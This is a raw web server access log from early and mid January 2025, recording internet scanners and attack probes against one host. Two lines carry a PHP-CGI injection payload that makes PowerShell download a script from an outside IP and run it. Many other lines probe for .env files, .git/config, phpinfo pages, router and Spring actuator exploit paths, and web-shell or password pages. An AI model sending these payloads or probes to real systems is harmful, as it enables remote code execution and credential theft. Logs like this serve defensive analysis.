193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /lara/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /laravel/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /.vscode/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /js/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /laravel/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /laravel/core/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:36 +0000] "GET /mail/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /mailer/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /nginx/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /public/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /site/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /xampp/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /.docker/laravel/app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:37 +0000] "GET /laravel/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /laravel/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /laravel/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /laravel/core/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /laravel/core/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /laravel/core/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /main/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:20:54:38 +0000] "GET /node_modules/.env HTTP/1.1" 302 386 "-" "-"
218.157.85.65 - - [05/Jan/2025:20:56:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
114.35.52.171 - - [05/Jan/2025:21:08:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
112.168.75.207 - - [05/Jan/2025:21:23:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [05/Jan/2025:21:47:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
166.88.134.89 - - [05/Jan/2025:21:53:36 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('powershell.exe%20-Command%20%22%26%20%7Biwr%20-Uri%20http%3A%2F%2F23.27.51.244%2Fscript.ps1%20-OutFile%20script.ps1%3B%20.%2Fscript.ps1%7D%22');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
121.188.115.113 - - [05/Jan/2025:22:04:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
35.203.211.153 - - [05/Jan/2025:22:32:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
206.189.144.32 - - [05/Jan/2025:22:35:59 +0000] "\x16\x03\x01\x01\x02\x01" 400 524 "-" "-"
206.189.144.32 - - [05/Jan/2025:22:35:59 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
91.223.3.201 - - [05/Jan/2025:22:47:22 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
166.88.134.89 - - [05/Jan/2025:22:49:00 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('powershell.exe%20-Command%20%22%26%20%7Biwr%20-Uri%20http%3A%2F%2F23.27.51.244%2Fscript.ps1%20-OutFile%20script.ps1%3B%20.%2Fscript.ps1%7D%22');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
112.168.75.207 - - [05/Jan/2025:22:56:32 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
196.127.36.34 - - [05/Jan/2025:23:07:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [05/Jan/2025:23:12:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
45.134.225.136 - - [05/Jan/2025:23:15:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
222.100.211.17 - - [05/Jan/2025:23:22:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
154.213.184.132 - - [05/Jan/2025:23:28:26 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
4.156.21.66 - - [05/Jan/2025:23:37:58 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
159.89.118.87 - - [05/Jan/2025:23:45:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
159.89.118.87 - - [05/Jan/2025:23:45:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
159.89.118.87 - - [05/Jan/2025:23:45:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [05/Jan/2025:23:45:27 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
159.89.118.87 - - [05/Jan/2025:23:45:27 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.89.118.87 - - [05/Jan/2025:23:45:28 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.89.118.87 - - [05/Jan/2025:23:45:28 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [05/Jan/2025:23:45:29 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [05/Jan/2025:23:45:29 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [05/Jan/2025:23:45:30 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.89.118.87 - - [05/Jan/2025:23:45:30 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
121.174.30.173 - - [05/Jan/2025:23:56:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [05/Jan/2025:23:57:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.226 - - [17/Jan/2025:00:02:39 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.172.72.201 - - [17/Jan/2025:00:51:54 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [17/Jan/2025:00:52:05 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
87.120.115.34 - - [17/Jan/2025:00:55:12 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
195.3.223.40 - - [17/Jan/2025:00:57:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.189.152.11 - - [17/Jan/2025:00:59:49 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [17/Jan/2025:01:00:02 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [17/Jan/2025:01:04:23 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [17/Jan/2025:01:04:32 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.172.72.201 - - [17/Jan/2025:01:04:50 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [17/Jan/2025:01:04:59 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
64.226.93.22 - - [17/Jan/2025:01:17:35 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0.1) Gecko/20100101 Firefox/52.0.1"
64.62.156.97 - - [17/Jan/2025:01:17:42 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
95.214.55.185 - - [17/Jan/2025:01:19:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.156.96 - - [17/Jan/2025:01:20:01 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
64.62.156.101 - - [17/Jan/2025:01:20:48 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
195.178.110.224 - - [17/Jan/2025:01:24:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
78.153.140.148 - - [17/Jan/2025:01:57:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:01:57:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [17/Jan/2025:01:59:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [17/Jan/2025:02:17:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.216.149.93 - - [17/Jan/2025:02:26:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
107.175.202.145 - - [17/Jan/2025:02:30:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 302 387 "http://34.93.54.196:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
34.38.226.167 - - [17/Jan/2025:02:48:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
31.13.224.222 - - [17/Jan/2025:02:53:16 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
78.153.140.148 - - [17/Jan/2025:03:05:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:03:05:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [17/Jan/2025:03:20:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [17/Jan/2025:03:20:17 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
61.122.254.71 - - [17/Jan/2025:03:25:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.196.220.253 - - [17/Jan/2025:03:29:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
92.255.57.58 - - [17/Jan/2025:03:32:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
107.175.212.18 - - [17/Jan/2025:03:54:53 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
179.43.191.146 - - [17/Jan/2025:04:04:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.25 - - [17/Jan/2025:04:13:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.25 - - [17/Jan/2025:04:13:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.148 - - [17/Jan/2025:04:16:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:04:16:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [17/Jan/2025:04:31:41 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [17/Jan/2025:04:31:49 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
15.235.224.238 - - [17/Jan/2025:04:33:17 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
115.65.18.10 - - [17/Jan/2025:04:44:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
213.168.249.254 - - [17/Jan/2025:04:52:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
213.168.249.254 - - [17/Jan/2025:04:52:59 +0000] "\x16\x03\x01" 400 524 "-" "-"
213.168.249.254 - - [17/Jan/2025:04:53:00 +0000] "\x16\x03\x01" 400 524 "-" "-"
213.168.249.254 - - [17/Jan/2025:04:53:00 +0000] "\x16\x03\x01" 400 524 "-" "-"
46.19.138.234 - - [17/Jan/2025:04:53:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [17/Jan/2025:05:08:20 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
172.104.11.4 - - [17/Jan/2025:05:46:22 +0000] "\x16\x03\x01" 400 524 "-" "-"
45.33.109.17 - - [17/Jan/2025:06:01:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.12 - - [17/Jan/2025:06:01:28 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
64.62.197.156 - - [17/Jan/2025:06:09:35 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.148 - - [17/Jan/2025:06:20:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:06:20:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.148.10.242 - - [17/Jan/2025:06:59:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.23 - - [17/Jan/2025:07:20:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
103.18.34.141 - - [17/Jan/2025:07:23:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
184.95.51.10 - - [17/Jan/2025:07:37:31 +0000] "GET /api/v1/clusters HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
205.210.31.183 - - [17/Jan/2025:07:38:04 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.183 - - [17/Jan/2025:07:38:04 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.148 - - [17/Jan/2025:07:39:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:07:39:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.34 - - [17/Jan/2025:07:41:03 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0"
167.94.145.102 - - [17/Jan/2025:07:55:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.102 - - [17/Jan/2025:07:55:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.102 - - [17/Jan/2025:07:55:56 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.102 - - [17/Jan/2025:07:55:57 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.102 - - [17/Jan/2025:07:55:57 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
198.235.24.86 - - [17/Jan/2025:08:19:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.215.236.132 - - [17/Jan/2025:08:33:11 +0000] "GET /.env HTTP/1.1" 302 350 "-" "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]"
5.181.190.248 - - [17/Jan/2025:08:48:18 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [17/Jan/2025:08:48:18 +0000] "GET / HTTP/1.1" 200 1742 "http://34.93.54.196:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
159.223.205.208 - - [17/Jan/2025:08:49:58 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-N935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
167.99.67.123 - - [17/Jan/2025:08:53:53 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [17/Jan/2025:08:54:00 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [17/Jan/2025:09:01:52 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [17/Jan/2025:09:02:00 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
185.10.68.236 - - [17/Jan/2025:09:04:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
167.172.90.143 - - [17/Jan/2025:09:06:42 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [17/Jan/2025:09:06:54 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
206.189.152.11 - - [17/Jan/2025:09:07:20 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [17/Jan/2025:09:07:31 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
79.136.24.140 - - [17/Jan/2025:09:20:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:09:23:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:09:23:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [17/Jan/2025:09:35:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
161.35.182.161 - - [17/Jan/2025:10:01:30 +0000] "\x16\x03\x01" 400 524 "-" "-"
161.35.182.161 - - [17/Jan/2025:10:01:30 +0000] "\x16\x03\x01" 400 524 "-" "-"
161.35.182.161 - - [17/Jan/2025:10:01:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [17/Jan/2025:10:01:31 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
161.35.182.161 - - [17/Jan/2025:10:01:32 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
161.35.182.161 - - [17/Jan/2025:10:01:32 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
161.35.182.161 - - [17/Jan/2025:10:01:32 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [17/Jan/2025:10:01:33 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [17/Jan/2025:10:01:33 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [17/Jan/2025:10:01:34 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
161.35.182.161 - - [17/Jan/2025:10:01:34 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
179.43.191.146 - - [17/Jan/2025:10:26:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [17/Jan/2025:10:31:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [17/Jan/2025:10:32:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [17/Jan/2025:10:32:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
157.66.55.50 - - [17/Jan/2025:10:33:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
157.66.55.50 - - [17/Jan/2025:10:33:36 +0000] "GET /js/login.js HTTP/1.1" 200 922 "-" "python-httpx/0.28.1"
157.66.55.50 - - [17/Jan/2025:10:33:36 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "-" "python-httpx/0.28.1"
173.167.43.6 - - [17/Jan/2025:10:39:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.55.185 - - [17/Jan/2025:10:40:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [17/Jan/2025:10:54:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
141.94.145.70 - - [17/Jan/2025:10:57:04 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/617.16.12 (KHTML, like Gecko) Version/17.7.92 Safari/617.16.12"
